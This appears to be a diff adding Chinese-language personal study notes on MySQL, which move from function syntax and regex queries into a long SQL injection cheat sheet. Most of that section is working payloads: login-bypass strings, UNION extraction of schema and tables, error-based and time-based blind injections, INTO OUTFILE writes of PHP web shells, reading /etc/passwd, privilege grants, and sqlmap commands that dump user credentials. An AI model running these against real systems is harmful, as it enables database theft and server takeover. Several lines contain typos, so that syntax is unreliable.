@@ -1,0 +1,161 @@
+******基础部分:
+
+//创建函数
+--规定所有传递参数都是in
+--改变结束符
+delimiter //
+--声明后赋值
+declare a int;
+set a = 3;
+--展示函数
+show create function 函数名;
+--删除函数
+drop function 函数名;
+/1
+mysql> create function sel() returns varchar(64)
+    -> return (select * from xjj where id=1);
+/2
+mysql> create function test(a int) returns int
+    -> return (a);
+/3
+mysql> create function test2(value int) return varchar(32) 
+    -> begin 
+    -> declare o_string varchar(10);
+    -> if (value < 10) then     //()加不加都行
+    -> set o_string="low";
+    -> else
+    -> set o_string="heigh";
+    -> end if;
+    -> return o_string;
+    -> end//
+
+
+
+//创建存储过程
+
+
+
+
+//正则表达式
+select * from xjj where name regexp '^[xabc].*2$';
+select * from xjj where name regexp '^x.{3}2';
+select * from xjj where name regexp '^x___2';
+//like表达式
+select * from xjj where name like 'x__2';
+select * from xjj where name like 'x%2';
+
+
+
+
+
+
+****//sql注入
+select * from table where username='' or 1=1 or '1'='1' and password=''
+select * from table where username='' and password='' or '1'='1'
+select * from table where username='admin'/*' amd password='*/'';
+select * from table where id=1/**/or/**/1=1  
+select benchmark(10000000,md5('hello'));
+
+select substring(user(),5,1)='@';  //return 1
+select count(*) from mysql.user where user=substring(user(),5,1);  //当前用户是否有权限查看mysql字典库
+select count(*) from information_schema.tables;  //当前用户是否有权限查看information_schema字典库
+
+select ascii(left(user(),1))=97;  //a的ascii
+
+//第三者上位,假设4的位置在网页中有显示那就替换成user(),database()等等
+?id=1' order by 1#   //进行尝试得出字段数量方便union
+?id=1 and 0=9 union select 1,2,3,4,5,6,7,8,9 --   
+//自己改造输出记录
+?id=123 and 0=1 union select 1,2,3,concat(ifnull(`name`,"xjj"),char(10),ifnull(`tel`,"12"),char(10))4,5,6,7,8,9 from `table1`,`table2` limit 1,100;
+//查询表名字段名
+?id=123 and 0=1 union select 1,2,3,concat(table_schema,table_name,table_comment),4,5,6,7,8,9 from information_schema.tables where table_schema=database() limit 1,10;
+
+//所有数据库名
+select schema_name from information_schema.schemata;
+//当前数据库的所有表的名字，行数
+select table_schema,table_name,table_rows from information_schema.tables where table_schema=database();
+//当前数据库的所有字段
+select table_name,table_schema,column_name,column_comment from columns where table_schema=database();
+
+//规避检查
+?id=123%20or%201=1;  //?id=123 or 1=1
+?id=1 and asii(left(user(),1))=121;
+
+//与系统层交互
+show gloabal variables like '%secure%';   //secure_file_priv为NULL才能写文件
+select "<?php @eval($_GET['test'])?>",2 into outfile '/test/2.php';//一句话木马
+select "<?php @system($_GET['test'])?>",2 into outfile '/test/2.php';//执行操作系统命令比如ls,ifconfig
+select '<script language="javascript">gogogo</script>' into outfile '/test.txt';
+select id,title from article where id>2 and 1=0  union select 1,load_file('/etc/passwd');
+
+//回收file权限
+revoke file on *.* from admin@`%`;
+flush privileges;
+ 
+//提权
+grant all privileges on *.* to admin@`%` identified by 123;
+
+//设置密码
+set password for root@`%` = password('root');
+
+//xml方法的sql注入,前提是页面有报错
+//updatexml是mysql对xml文档查询和修改的函数,并且需要使用concat函数否则输出错误不全面
+//updatexml中三个参数分别代表:1.需要查找或者替换的表中字段名，Xpath格式的字符串，替换的内容.报错只能显示一行
+select * from article where id=1 and (updatexml('anything',concat(0x7e,(select version()),0x7e),'andthing'));
+//extractvalue()是对xml文档查询的函数
+kobe' and extractvalue(0,concat(0x7e,version()));#
+
+//insert注入
+insert into table (firstname,lastname) values 
+('john',(select top 1 name +'|'+master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins));
+
+
+insert into table1 values ('' || select (select case when @@version like '5.1.56%' then sleep(5) else 'somevalue' end from ((select 'value1' as foobar)union (select 'value2' as foobar)) alias) || '')
+
+
+insert into xjj (name,sex) values ('foo',concat('bar',(select @@version)));
+
+
+
+//其他的方法
+URI injections
+
+//payload for error-based
+id=1' 
+AND (SELECT 8837 
+	FROM(
+	SELECT COUNT(*),
+	CONCAT(0x7171717671,
+	(SELECT (ELT(8837=8837,1))),
+	0x71786b6b71,
+	FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)
+    a) 
+AND 'powp'='powp
+
+(SELECT 8837 FROM(SELECT COUNT(*),CONCAT(0x7171717671,(SELECT (ELT(8837=8837,1))),0x71786b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 
+
+
+//盲注
+//1
+//time-based blind基于时间的盲注
+//一般是页面没有任何显示采取的策略sleep(5);
+if(substr(database(),1,1)='p',sleep(2),NULL);
+
+id=1' 
+AND (SELECT 2589 
+	FROM (SELECT(SLEEP(5)))
+    LvKz) 
+AND 'bhZm'='bhZm
+
+//基于真假的boolen注入
+kobe' or 1=1#     //执行成功意味着1=1部分没有过滤
+kobe' and 1=1#    //执行成功意味着1=1部分没有过滤
+
+
+
+//sqlmap
+sqlmap -u url
+sqlmap -u url --current-db
+sqlmap -u url -D pikachu --tables
+sqlmap -u url -T users --columns
+sqlmap -u url -T users -C username,password --dump
